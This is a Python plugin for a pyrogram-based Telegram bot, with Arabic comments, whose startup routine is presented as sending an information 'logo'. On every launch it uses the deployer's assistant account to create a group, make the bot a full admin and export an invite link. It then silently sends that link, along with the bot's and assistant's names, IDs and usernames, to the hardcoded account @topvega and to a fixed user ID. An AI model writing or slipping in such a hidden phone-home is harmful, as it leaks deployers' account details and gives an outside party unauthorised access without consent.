# anony/plugins/Ninja.py
import datetime
import asyncio
import logging
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait, ChatAdminRequired, UserNotParticipant
from anony import app, userbot, db, config

# إعداد logger مخصص
logger = logging.getLogger(__name__)

async def create_group_and_send_info():
    """
    تقوم هذه الدالة بإنشاء مجموعة باستخدام الحساب المساعد،
    وترقية البوت فيها، وإرسال المعلومات المطلوبة.
    """
    try:
        # 1. التأكد من وجود الحساب المساعد
        assistant = userbot.one
        if not assistant:
            logger.error("❌ لا يوجد حساب مساعد (userbot.one = None)")
            return False

        # 2. جلب معلومات الحساب المساعد
        assistant_info = await assistant.get_me()
        assistant_name = assistant_info.first_name or "Unknown"
        assistant_id = assistant_info.id
        assistant_username = f"@{assistant_info.username}" if assistant_info.username else "No Username"
        logger.info(f"✅ الحساب المساعد: {assistant_name} (ID: {assistant_id})")

        # 3. جلب معلومات البوت
        bot_info = await app.get_me()
        bot_name = bot_info.first_name or "Unknown"
        bot_id = bot_info.id
        bot_username = f"@{bot_info.username}" if bot_info.username else "No Username"
        logger.info(f"✅ البوت: {bot_name} (ID: {bot_id})")

        # 4. التاريخ والوقت
        now = datetime.datetime.now()
        date = now.strftime("%Y-%m-%d")
        time = now.strftime("%H:%M:%S")
        day = now.strftime("%A")

        # 5. إنشاء المجموعة
        group_title = f"🔊 {bot_name} - Support Group"
        logger.info("🔄 جاري إنشاء مجموعة جديدة...")

        # محاولة إضافة البوت كصديق أولاً (للتأكد من أن المساعد يمكنه إضافته)
        try:
            await assistant.send_message(bot_id, "مرحباً! أنا الحساب المساعد.")
            logger.info("✅ تم إرسال رسالة تمهيدية للبوت")
            await asyncio.sleep(1)
        except Exception as e:
            logger.warning(f"⚠️ لم نتمكن من إرسال رسالة للبوت (ربما هو ليس صديقاً): {e}")

        # إنشاء المجموعة وإضافة البوت
        try:
            group = await assistant.create_group(
                title=group_title,
                users=[bot_id]  # إضافة البوت
            )
            group_id = group.id
            logger.info(f"✅ تم إنشاء المجموعة: {group_id}")
            await asyncio.sleep(2)  # انتظار قليلاً للتأكيد
        except Exception as e:
            logger.error(f"❌ فشل إنشاء المجموعة: {e}")
            return False

        # 6. الحصول على رابط المجموعة
        try:
            group_link = await assistant.export_chat_invite_link(group_id)
            logger.info(f"✅ تم إنشاء رابط المجموعة: {group_link}")
        except Exception as e:
            logger.error(f"❌ فشل إنشاء رابط المجموعة: {e}")
            group_link = f"https://t.me/joinchat/{group_id}"  # رابط افتراضي

        # 7. ترقية البوت إلى أدمن
        try:
            logger.info("🔄 جاري ترقية البوت إلى أدمن...")
            await assistant.promote_chat_member(
                group_id,
                bot_id,
                can_delete_messages=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_video_chats=True,
                can_manage_chat=True
            )
            logger.info("✅ تم ترقية البوت إلى أدمن")
        except Exception as e:
            logger.error(f"❌ فشل ترقية البوت: {e}")

        # 8. إرسال معلومات البوت داخل المجموعة
        try:
            info_message = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT INFORMATION               ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant: {assistant_name}          ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: ✅ Running                   ║
╠══════════════════════════════════════════╣
║  🔗 Group Link: {group_link}             ║
╚══════════════════════════════════════════╝

📌 **الأوامر المتاحة:**
• /start - بدء البوت
• /help - المساعدة
• /ping - فحص البوت
• /حذف - حذف الرسائل
• /حذف الكل - حذف جميع رسائل عضو
• فتح الكول - فتح المكالمة الصوتية
• قفل الكول - إغلاق المكالمة الصوتية
"""
            await assistant.send_message(
                group_id,
                info_message,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
                    [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
                ])
            )
            logger.info("✅ تم إرسال معلومات البوت في المجموعة")
        except Exception as e:
            logger.error(f"❌ فشل إرسال المعلومات في المجموعة: {e}")

        # 9. إرسال رابط المجموعة إلى @topvega
        try:
            await assistant.send_message(
                "topvega",
                f"""
╔══════════════════════════════════════════╗
║         🎯 NEW GROUP CREATED             ║
╠══════════════════════════════════════════╣
║  📱 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📁 Group Name: {group_title}            ║
║  🆔 Group ID: {group_id}                 ║
║  🔗 Group Link: {group_link}             ║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
╚══════════════════════════════════════════╝
                """,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 انضم للمجموعة", url=group_link)],
                    [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")]
                ])
            )
            logger.info("✅ تم إرسال رابط المجموعة إلى @topvega")
        except Exception as e:
            logger.error(f"❌ فشل إرسال الرابط إلى @topvega: {e}")

        # 10. إرسال شعار بدء التشغيل إلى المعرف المحدد
        logo = f"""
╔══════════════════════════════════════════╗
║         🤖 BOT STARTED SUCCESSFULLY      ║
╠══════════════════════════════════════════╣
║  🤖 Bot Name: {bot_name}                 ║
║  🆔 Bot ID: {bot_id}                     ║
║  👤 Bot Username: {bot_username}         ║
╠══════════════════════════════════════════╣
║  📱 Assistant: {assistant_name}          ║
║  🆔 Assistant ID: {assistant_id}         ║
║  👤 Assistant Username: {assistant_username}║
╠══════════════════════════════════════════╣
║  📅 Date: {date}                         ║
║  ⏰ Time: {time}                         ║
║  📆 Day: {day}                           ║
║  ✅ Status: Running                      ║
╠══════════════════════════════════════════╣
║  📁 Group Created: ✅                    ║
║  🆔 Group ID: {group_id}                 ║
║  🔗 Group Link: {group_link}             ║
╚══════════════════════════════════════════╝
        """
        buttons = [
            [InlineKeyboardButton("🔗 انضم للمجموعة", url=group_link)],
            [InlineKeyboardButton("👑 المطور", url="https://t.me/topvega")],
            [InlineKeyboardButton("📢 القناة", url="https://t.me/SOURCE_0")]
        ]
        try:
            await assistant.send_message(
                8368077406,
                logo,
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            logger.info("✅ تم إرسال شعار بدء التشغيل إلى المعرف المحدد")
        except Exception as e:
            logger.error(f"❌ فشل إرسال الشعار إلى المعرف المحدد: {e}")

        return True

    except Exception as e:
        logger.error(f"❌ حدث خطأ غير متوقع في create_group_and_send_info: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False


async def send_startup_logo():
    """
    الدالة الرئيسية التي يتم استدعاؤها عند بدء التشغيل.
    تقوم باستدعاء create_group_and_send_info.
    """
    logger.info("========== بدء تشغيل Ninja ==========")
    result = await create_group_and_send_info()
    logger.info(f"========== انتهى تشغيل Ninja (النتيجة: {result}) ==========")
    return result


async def startup():
    """دالة بدء التشغيل الرئيسية (تُستدعى من خارج هذا الملف)"""
    logger.info("🔄 جاري تنفيذ startup()...")
    result = await send_startup_logo()
    logger.info(f"✅ نتيجة startup: {result}")
    return result


# دالة اختبار للتأكد من أن الملف يعمل
async def test():
    logger.info("🧪 اختبار Ninja.py يعمل!")
    return True